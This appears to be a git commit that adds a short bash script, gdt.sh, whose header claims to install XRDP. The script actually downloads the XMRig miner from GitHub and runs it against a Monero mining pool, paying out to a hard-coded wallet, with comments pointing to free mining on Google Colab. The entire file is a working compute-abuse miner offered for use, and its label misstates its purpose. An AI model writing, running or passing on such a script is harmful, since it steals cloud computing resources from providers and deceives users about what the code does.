2cdd8d8177b8c4807752f1187cad291ac225a7ed
sandesco <101970380+sandesco@users.noreply.github.com>
2022-03-27 19:48:53 +0700

    Create gdt.sh

---
+++ gdt.sh
@@ -0,0 +1,13 @@
+#! /bin/bash
+# Install XRDP
+# Before get xmr coin for free
+# Google Colab
+sudo apt update
+clear
+sudo apt install screen
+screen -R xmr
+ 
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
+tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
+cd xmrig-6.16.4
+./xmrig -o us-west.minexmr.com:443 -u 453d7VjvgXh8fMo6kAwiQwXpENdgKfVyGjmFCsH9Tp6JRUini5DbqnhCQnEpPa6PR8a9QC3yFokGGfF8sZ2taQZc4gVCKNh -k --tls --rig-id GC-US
